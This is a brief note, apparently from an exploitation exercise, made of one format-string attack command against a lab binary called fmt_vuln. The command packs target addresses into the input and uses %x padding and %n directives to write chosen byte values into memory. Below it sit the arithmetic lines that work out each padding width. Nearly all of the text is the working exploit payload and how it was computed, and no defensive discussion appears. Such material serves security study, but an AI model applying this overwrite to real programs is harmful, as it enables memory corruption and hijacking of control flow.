./fmt_vuln $(printf "\xcc\x98\x04\x08JUNK\xcd\x98\x04\x08JUNK\xce\x98\x04\x08JUNK\xcf\x98\x04\x08")%0110x%x%x%x%x%x%n%017x%n%017x%n%017x%n

110 = 0xaa - (68-8)
17 = 0xbb - 0xaa
17 = 0xcc - 0xbb
17 = 0xdd - 0xcc
